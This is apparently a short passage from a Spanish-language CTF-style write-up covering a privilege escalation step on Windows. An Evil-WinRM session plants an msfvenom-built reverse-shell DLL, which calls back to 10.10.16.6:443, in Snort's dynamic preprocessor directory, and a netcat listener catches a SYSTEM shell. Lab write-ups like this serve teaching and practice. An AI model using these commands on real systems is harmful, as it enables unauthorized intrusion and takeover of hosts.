
# ESCALADA
```shell
*Evil-WinRM* PS C:\Snort> cd etc
*Evil-WinRM* PS C:\Snort\etc> type snort.conf | findstr dynamicpreprocessor
dynamicpreprocessor directory C:\Snort\lib\snort_dynamicpreprocessor
*Evil-WinRM* PS C:\Snort\etc> cd C:\Snort\lib\snort_dynamicpreprocessor
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f dll -a x64 -o reverse.dll
*Evil-WinRM* PS C:\Snort\lib\snort_dynamicpreprocessor> upload reverse.dll
#SOLO LO SUBIMOS
❯ sudo rlwrap -cAr nc -nlvp 443
#DESPUÉS DE UN RATO...
C:\Windows\system32>
```